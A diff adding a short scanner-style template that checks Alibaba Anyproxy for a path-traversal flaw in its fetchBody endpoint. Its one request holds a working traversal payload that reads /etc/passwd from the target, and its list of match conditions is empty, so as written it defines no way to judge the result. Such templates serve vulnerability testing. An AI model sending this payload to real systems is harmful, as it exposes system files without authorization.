@@ -1,0 +1,16 @@
+id: alibaba-anyproxy-lfi
+brief:
+    title: Alibaba Anyproxy fetchBody File - Path Traversal
+    by: DhiyaneshDk
+    level: high
+    about: Alibaba Anyproxy is vulnerable to Path Traversal.
+    label:
+        - alibaba
+        - anyproxy
+        - lfi
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/fetchBody?id=1/../../../../../../../../etc/passwd'
+      signs: []
